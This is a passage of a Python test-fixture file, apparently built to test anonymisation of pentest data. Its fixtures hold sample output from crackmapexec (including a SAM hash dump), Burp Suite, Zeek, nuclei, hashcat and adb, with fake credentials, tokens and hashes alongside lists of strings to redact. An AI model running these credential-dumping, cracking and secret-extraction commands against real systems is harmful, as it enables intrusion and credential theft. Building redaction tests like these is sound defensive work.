$ crackmapexec smb 10.20.0.10 -u administrador -p 'V3r@n0S3gur0!' --shares
SMB         10.20.0.10    445    AURORA-DC01      Share           Permissions     Remark
SMB         10.20.0.10    445    AURORA-DC01      -----           -----------     ------
SMB         10.20.0.10    445    AURORA-DC01      ADMIN$          READ,WRITE      Remote Admin
SMB         10.20.0.10    445    AURORA-DC01      C$              READ,WRITE      Default share
SMB         10.20.0.10    445    AURORA-DC01      NETLOGON        READ            Logon server share
SMB         10.20.0.10    445    AURORA-DC01      Projetos        READ,WRITE
SMB         10.20.0.10    445    AURORA-DC01      SYSVOL          READ            Logon server share

$ crackmapexec smb 10.20.0.10 -u administrador -p 'V3r@n0S3gur0!' --users
SMB         10.20.0.10    445    AURORA-DC01      [+] Enumerated domain user(s)
SMB         10.20.0.10    445    AURORA-DC01      aurora.local\\bianca.ferrari     badpwdcount: 0 baddpwdtime: 2024-02-10 14:22:01
SMB         10.20.0.10    445    AURORA-DC01      aurora.local\\marcos.vinicius    badpwdcount: 1 baddpwdtime: 2024-02-10 09:55:14
SMB         10.20.0.10    445    AURORA-DC01      aurora.local\\svc_scan           badpwdcount: 0 baddpwdtime: 2024-01-28 08:10:00
SMB         10.20.0.10    445    AURORA-DC01      aurora.local\\patricia.lemos     badpwdcount: 0 baddpwdtime: 2024-02-08 16:44:30

$ crackmapexec smb 10.20.0.11 -u administrador -p 'V3r@n0S3gur0!' --sam
SMB         10.20.0.11    445    AURORA-FS01      [+] Dumping SAM hashes
SMB         10.20.0.11    445    AURORA-FS01      Administrador:500:aad3b435b51404eeaad3b435b51404ee:8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918:::
SMB         10.20.0.11    445    AURORA-FS01      Convidado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
""",
    must_anonymize=[
        "V3r@n0S3gur0!",
        "AURORA-DC01", "AURORA-FS01", "AURORA-WKS05",
        "aurora.local",
        "10.20.0.10", "10.20.0.11", "10.20.0.12",
        "bianca.ferrari", "marcos.vinicius", "svc_scan", "patricia.lemos",
        "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918",
        "31d6cfe0d16ae931b73c59d7e0c089c0",
    ],
    safe_to_keep=[
        "crackmapexec", "smb", "--shares", "--users", "--sam",
        "NETLOGON", "SYSVOL", "ADMIN$",
        "domain admins", "SMBv1", "signing",
    ],
)

BURPSUITE_HTTP_HISTORY = PentestFixture(
    name="burpsuite_http_history",
    description="Burp Suite HTTP history with credentials in POST bodies and Authorization headers",
    text="""\
POST /api/v2/auth/login HTTP/1.1
Host: app.vertexcorp.io
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbl91c2VyIiwiZXhwIjoxNzA5MDAwMDAwfQ.fake_sig

{"username":"thiago.barbosa","password":"Vert3x@2024!","remember":true}

HTTP/2 200 OK
Content-Type: application/json
Set-Cookie: session=a3f8c2d1e9b045678f2e3a4b5c6d7e8f; Path=/; HttpOnly; Secure

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0aGlhZ28uYmFyYm9zYSIsInJvbGUiOiJhZG1pbiJ9.fake","user":{"id":1042,"email":"thiago.barbosa@vertexcorp.io"}}

---

POST /api/v2/users/reset-password HTTP/1.1
Host: app.vertexcorp.io
Cookie: session=a3f8c2d1e9b045678f2e3a4b5c6d7e8f
Content-Type: application/json

{"user_id":1042,"new_password":"N3wP@ssw0rd_2024","token":"c7e2f1a4b3d8e0f9a2b4c6d8e0f2a4b6"}

---

GET /admin/export?format=csv&token=sk_prod_KRTy7mNvQ9pXsW2bF5hL3dAeC8jUuG6z HTTP/1.1
Host: app.vertexcorp.io
Authorization: Basic dGhpYWdvLmJhcmJvc2E6VmVydDN4QDIwMjQh

---

POST /api/internal/db-query HTTP/1.1
Host: internal-api.vertexcorp.io
X-Internal-Token: int_tok_v2_mQ9pXsW2bF5hL3dAeC8jUuG6zKRTy7n
Content-Type: application/json

{"query":"SELECT * FROM users WHERE email='thiago.barbosa@vertexcorp.io'","db":"vertexcorp_prod"}
""",
    must_anonymize=[
        "thiago.barbosa",
        "thiago.barbosa@vertexcorp.io",
        "vertexcorp.io",
        "Vert3x@2024!",
        "a3f8c2d1e9b045678f2e3a4b5c6d7e8f",
        "N3wP@ssw0rd_2024",
        "c7e2f1a4b3d8e0f9a2b4c6d8e0f2a4b6",
        "sk_prod_KRTy7mNvQ9pXsW2bF5hL3dAeC8jUuG6z",
        "int_tok_v2_mQ9pXsW2bF5hL3dAeC8jUuG6zKRTy7n",
        "vertexcorp_prod",
    ],
    safe_to_keep=[
        "HTTP/1.1", "HTTP/2", "Content-Type", "Authorization",
        "application/json", "Set-Cookie", "HttpOnly", "Secure",
        "Bearer", "POST", "GET", "Host",
        "SELECT", "FROM", "WHERE",
    ],
)

ZEEK_CONN_LOG = PentestFixture(
    name="zeek_conn_log_analysis",
    description="Zeek/Bro conn.log analysis during red team engagement showing internal traffic",
    text="""\
#separator \\x09
#set_separator ,
#fields ts  uid  id.orig_h  id.orig_p  id.resp_h  id.resp_p  proto  service  duration  orig_bytes  resp_bytes  conn_state

1707912601.123456  CmBfLq1XzY2aB3cD4e  172.16.5.45   54231  172.16.5.1    53    udp   dns     0.001  62   160  SF
1707912601.234567  CnCgMr2YaZ3bC4dE5f  172.16.5.45   49152  172.16.5.10   445   tcp   smb     0.284  4096 8192 SF
1707912601.345678  CoDhNs3ZbA4cD5eF6g  172.16.5.45   49153  172.16.5.20   443   tcp   ssl     1.204  2048 16384 SF
1707912601.456789  CpEiOt4AcB5dE6fG7h  172.16.5.45   49154  172.16.5.20   8080  tcp   http    0.089  512  4096 SF

# Suspicious lateral movement detected from NOVA-WKS14 (172.16.5.45)
# Targeting NOVA-DC02 (172.16.5.10) and NOVA-PROXY01 (172.16.5.20)

1707912605.123456  CqFjPu5BdC6eF7gH8i  172.16.5.45   49155  172.16.5.10   88    tcp   kerberos 0.012  1024 2048 SF
1707912605.234567  CrGkQv6CeD7fG8hI9j  172.16.5.45   49156  172.16.5.10   389   tcp   ldap    0.045  512  8192 SF
1707912605.345678  CsHlRw7DfE8gH9iJ0k  172.16.5.45   49157  172.16.5.10   636   tcp   ldap    0.038  512  8192 SF
1707912605.456789  CtImSx8EgF9hI0jK1l  172.16.5.45   49158  172.16.5.30   5985  tcp   http    2.104  65536 131072 SF

# WinRM connection to NOVA-WEBAPP01 (172.16.5.30)
# Source: NOVA-WKS14 user: fernanda.xavier (observed in HTTP POST /wsman)

1707912610.123456  CuJnTy9FhG0iJ1kL2m  172.16.5.45   49159  8.8.8.8       443   tcp   ssl     0.234  256  512  SF
1707912610.234567  CvKoUz0GiH1jK2lM3n  172.16.5.45   49160  203.88.55.77  4444  tcp   -       45.102 2097152 1048576 SF

# Outbound C2 beacon to 203.88.55.77:4444 — 45s beacon interval
# Internal org: Novatech Sistemas
""",
    must_anonymize=[
        "172.16.5.45", "172.16.5.10", "172.16.5.20", "172.16.5.30",
        "203.88.55.77",
        "NOVA-WKS14", "NOVA-DC02", "NOVA-PROXY01", "NOVA-WEBAPP01",
        "fernanda.xavier",
        "Novatech Sistemas",
    ],
    safe_to_keep=[
        "zeek", "smb", "ldap", "kerberos", "http", "ssl", "dns", "tcp", "udp",
        "8.8.8.8",
        "445", "443", "88", "389", "636", "5985",
        "SF", "conn_state", "orig_bytes", "resp_bytes",
    ],
)


NUCLEI_SCAN = PentestFixture(
    name="nuclei_scan",
    description="Nuclei vulnerability scanner output against web targets with CVEs and org-specific URLs",
    text=(
        "nuclei -u https://portal.heliosgroup.com.br -t cves/ -t exposures/ -o helios_nuclei.txt\n"
        "\n"
        "                     __     _\n"
        "   ____  __  _______/ /__  (_)\n"
        "  / __ \\/ / / / ___/ / _ \\/ /\n"
        " / / / / /_/ / /__/ /  __/ /\n"
        "/_/ /_/\\__,_/\\___/_/\\___/_/   v3.1.4\n"
        "\n"
        "[INF] Current nuclei version: v3.1.4\n"
        "[INF] Targets loaded for current scan: 1\n"
        "\n"
        "[2024-03-14 09:12:01] [CVE-2021-44228] [http] [critical] https://portal.heliosgroup.com.br/login?next=%24%7B%7B%22test%22%7D%7D\n"
        "[2024-03-14 09:12:03] [CVE-2022-22965] [http] [critical] https://portal.heliosgroup.com.br/api/actuator/env\n"
        "[2024-03-14 09:12:07] [springboot-actuator-logfile-exposure] [http] [medium] https://portal.heliosgroup.com.br/api/actuator/logfile\n"
        "[2024-03-14 09:12:11] [apache-solr-log4j-rce] [http] [critical] https://intranet.heliosgroup.com.br:8983/solr/admin/cores?action=STATUS\n"
        "[2024-03-14 09:12:15] [CVE-2023-34362] [http] [critical] https://vpn.heliosgroup.com.br/dana-na/auth/url_default/welcome.cgi\n"
        "[2024-03-14 09:12:18] [fortios-auth-bypass] [http] [critical] https://vpn.heliosgroup.com.br/ [matched: \"Please Login\"]\n"
        "[2024-03-14 09:12:22] [exposed-git-config] [http] [medium] https://portal.heliosgroup.com.br/.git/config [size: 312]\n"
        "[2024-03-14 09:12:25] [laravel-debug-enabled] [http] [low] https://api.heliosgroup.com.br/v2/debug [status: 500]\n"
        "[2024-03-14 09:12:30] [CVE-2019-11510] [http] [critical] https://vpn.heliosgroup.com.br/dana-na/auth/url_default/welcome.cgi\n"
        "[2024-03-14 09:12:33] [http-missing-security-headers] [http] [info] https://portal.heliosgroup.com.br/\n"
        "\n"
        "[INF] Scan summary: critical=5, high=0, medium=2, low=1, info=1\n"
        "[INF] Output written to helios_nuclei.txt\n"
    ),
    must_anonymize=[
        "heliosgroup.com.br",
        "portal.heliosgroup.com.br",
        "intranet.heliosgroup.com.br",
        "vpn.heliosgroup.com.br",
        "api.heliosgroup.com.br",
        "helios_nuclei.txt",
    ],
    safe_to_keep=[
        "nuclei", "CVE-2021-44228", "CVE-2022-22965", "CVE-2023-34362",
        "CVE-2019-11510", "springboot-actuator-logfile-exposure",
        "apache-solr-log4j-rce", "fortios-auth-bypass", "exposed-git-config",
        "laravel-debug-enabled", "http-missing-security-headers",
        "critical", "medium", "low", "info", "http",
        "actuator", "logfile", "solr", "FortiOS",
    ],
)

HASHCAT_SESSION = PentestFixture(
    name="hashcat_cracking_session",
    description="Hashcat NTLM cracking session with wordlist, rules, and cracked results",
    text="""\
hashcat -m 1000 -a 0 delta_ntlm_hashes.txt /opt/wordlists/rockyou.txt -r /opt/rules/best64.rule --potfile-path delta.pot -o delta_cracked.txt

hashcat (v6.2.6) starting...

OpenCL API (OpenCL 3.0 PoCL 3.1) - Platform #1 [The pocl project]
=================================================================
* Device #1: pthread-Intel(R) Core(TM) i9-10900K CPU @ 3.70GHz, 512/1024 MB (256 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 47 digests; 47 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 77

Dictionary cache hit:
* Filename..: /opt/wordlists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921504

f24a7af0b8b2b9c5d4e3f218aa4f96a3:Delta@Corp2024!
31d6cfe0d16ae931b73c59d7e0c089c0:
9bb5e7b4c35d8f92a1c3d4e5f6a7b8c9:Backup#Serv1ce
b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6:Delta_2024_Gustavo
3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f:Winter2024!

Approaching final keyspace - workload adjusted

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: delta_ntlm_hashes.txt
Time.Started.....: Thu Jan 15 11:30:00 2024 (2 mins, 17 secs)
Time.Estimated...: Thu Jan 15 11:32:17 2024 (0 secs)
Guess.Base.......: File (/opt/wordlists/rockyou.txt)
Guess.Mod........: Rules (/opt/rules/best64.rule)
Speed.#1.........: 1234.5 MH/s (7.04ms) @ Accel:512 Loops:77 Thr:1 Vec:8
Recovered........: 5/47 (10.64%) Digests, 1/1 Salts
Progress.........: 4239978496/1104518608 (384.04%)
""",
    must_anonymize=[
        "delta_ntlm_hashes.txt",
        "delta.pot",
        "delta_cracked.txt",
        "f24a7af0b8b2b9c5d4e3f218aa4f96a3",
        "Delta@Corp2024!",
        "9bb5e7b4c35d8f92a1c3d4e5f6a7b8c9",
        "Backup#Serv1ce",
        "b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6",
        "Delta_2024_Gustavo",
        "3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f",
        "Winter2024!",
    ],
    safe_to_keep=[
        "hashcat", "NTLM", "rockyou.txt", "best64.rule",
        "-m", "-a", "-r", "1000", "OpenCL",
        "Status", "Hash.Mode", "Speed", "Recovered", "Progress",
    ],
)

SURICATA_ALERTS = PentestFixture(
    name="suricata_ids_alerts",
    description="Suricata IDS alert log during an engagement — internal IPs, hostnames, and org-specific traffic",
    text="""\
01/15/2024-09:14:01.183421  [**] [1:2008578:7] ET SCAN Nmap Scripting Engine User-Agent Detected (Nmap Scripting Engine) [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 10.55.1.200:52341 -> 10.55.0.10:80
01/15/2024-09:14:03.291033  [**] [1:2019284:4] ET EXPLOIT Apache Log4j RCE Attempt [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 10.55.1.200:52341 -> 10.55.0.10:8080
01/15/2024-09:14:05.445211  [**] [1:2230010:1] ET POLICY SMB2 NT Create AndX Request For an Executable File [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {TCP} 10.55.1.200:49212 -> 10.55.0.5:445
01/15/2024-09:14:12.882145  [**] [1:2024897:5] ET MALWARE Possible Mimikatz User-Agent [**] [Classification: A Network Trojan was Detected] [Priority: 1] {TCP} 10.55.1.200:49218 -> 10.55.0.5:445
01/15/2024-09:14:17.334891  [**] [1:2013504:7] ET POLICY GNU/Linux APT User-Agent In Use [**] [Priority: 3] {TCP} 10.55.0.22:39821 -> 185.44.77.250:80
01/15/2024-09:14:19.001234  [**] [1:2010935:3] ET POLICY Outbound SMTP [**] [Priority: 2] {TCP} 10.55.0.15:49001 -> 203.55.19.88:25
01/15/2024-09:14:23.559312  [**] [1:2002911:5] ET SCAN Potential SSH Scan OUTBOUND [**] [Priority: 2] {TCP} 10.55.1.200:33291 -> 10.55.0.0/24:22
01/15/2024-09:14:31.112988  [**] [1:2023476:1] ET EXPLOIT Possible NTLM Relay Attack [**] [Classification: Attempted User Privilege Gain] [Priority: 1] {TCP} 10.55.1.200:49229 -> 10.55.0.5:445
""",
    must_anonymize=[
        "10.55.1.200",
        "10.55.0.10",
        "10.55.0.5",
        "10.55.0.22",
        "10.55.0.15",
        "10.55.0.0/24",
        "185.44.77.250",
        "203.55.19.88",
    ],
    safe_to_keep=[
        "Suricata", "ET SCAN", "ET EXPLOIT", "ET MALWARE", "ET POLICY",
        "Nmap", "Apache Log4j", "SMB2", "Mimikatz", "SMTP", "SSH",
        "TCP", "Classification", "Priority",
        "Web Application Attack", "Attempted Administrator Privilege Gain",
        "CVE", "NTLM Relay",
    ],
)

ADB_MOBILE_PENTEST = PentestFixture(
    name="adb_mobile_pentest",
    description="ADB shell session on a corporate Android device — serial, packages, hardcoded secrets",
    text="""\
$ adb devices
List of devices attached
R38M9T2K44A    device

$ adb -s R38M9T2K44A shell
OP5001:/ $ getprop ro.serialno
R38M9T2K44A

$ pm list packages | grep aurora
package:br.com.aurorabank.mobile
package:com.aurora.internal.toolkit

OP5001:/ $ cat /data/local/tmp/aurora_config.json
{
    "api_endpoint": "https://api.aurora.com.br",
    "api_key": "au_prod_8k3mN9pXqR7vT2wL5jKsYcBd4nZe6fGhAiOu0CtDy",
    "internal_token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJtb2JpbGUtYXBwIn0.dGVzdHNpZw",
    "debug_user": "mobile_test@aurora.com.br",
    "debug_pass": "AurDev2024!",
    "backend_host": "10.200.100.50"
}

OP5001:/ $ strings /data/app/br.com.aurorabank.mobile/lib/arm64/libaurora.so | grep -i key
AURORA_INTERNAL_PASS=DevTest@Aurora!
ENCRYPTION_KEY=AuR0rA$3cr3tK3y2024
""",
    must_anonymize=[
        "R38M9T2K44A",
        "br.com.aurorabank.mobile",
        "com.aurora.internal.toolkit",
        "api.aurora.com.br",
        "au_prod_8k3mN9pXqR7vT2wL5jKsYcBd4nZe6fGhAiOu0CtDy",
        "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJtb2JpbGUtYXBwIn0.dGVzdHNpZw",
        "mobile_test@aurora.com.br",
        "AurDev2024!",
        "10.200.100.50",
        "DevTest@Aurora!",
        "AuR0rA$3cr3tK3y2024",
    ],
    safe_to_keep=[
        "adb", "shell", "getprop", "pm list packages", "strings",
        "ro.serialno", "api_endpoint", "api_key", "debug_user",
    ],
)

ALL_FIXTURES = [
    NMAP_SCAN,
    NMAP_SERVICE_VERSIONS,
    MIMIKATZ_OUTPUT,
    CRACKMAPEXEC_OUTPUT,
    BURP_REQUEST,
    ENUM4LINUX_OUTPUT,
    RECON_NOTES,
    BASH_HISTORY,
    LDAP_DUMP,
    METASPLOIT_SESSION,
    AWS_CREDENTIAL_LEAK,
    CLOUD_PENTEST_SESSION,
    CORPORATE_EMAIL_LEAK,
    PRIVESC_CONFIG_DUMP,
    AZURE_AD_DUMP,
    KERBEROASTING,
    SQLMAP_OUTPUT,
    KUBERNETES_PENTEST,
    CERTIPY_ADCS,
    GCP_PENTEST,
    BLOODHOUND_PATHS,
    WIFI_PENTEST,
    PIVOTING_LATERAL,
    # New fixtures from HackTricks scenario research
    DCSYNC_DUMP,
    MSSQL_PENTEST,
    DOCKER_ESCAPE,
    JENKINS_RCE,
    NETEXEC_SMB,
    LDAP_ENUM,
    EXCHANGE_OWA,
    # Scenario expansion — modern tools and cloud-native attacks
    SLIVER_C2,
    TERRAFORM_STATE,
    GIT_CREDENTIAL_EXPOSURE,
    RESPONDER_NTLMV2,
    LINPEAS_OUTPUT,
    AWS_IAM_PRIVESC,
    SAAS_CREDENTIAL_DUMP,
    # Continuous expansion — new scenarios each improvement cycle
    WINPEAS_OUTPUT,
    THEHARVESTER_OSINT,
    AZURE_KEYVAULT_ENUM,
    # Cycle 2 additions
    EMPIRE_C2,
    PACU_AWS_ENUM,
    VOLATILITY_FORENSICS,
    # Cycle 3 additions
    GOPHISH_CAMPAIGN,
    SHODAN_RECON,
    CLOUDTRAIL_LOGS,
    # Cycle 4 additions
    CRACKMAPEXEC_SMB,
    BURPSUITE_HTTP_HISTORY,
    ZEEK_CONN_LOG,
    # Cycle 6 additions — scanner outputs and IDS logs
    NUCLEI_SCAN,
    HASHCAT_SESSION,
    SURICATA_ALERTS,
    # Cycle 7 additions — mobile/IoT and extended env-var credentials
    ADB_MOBILE_PENTEST,
]
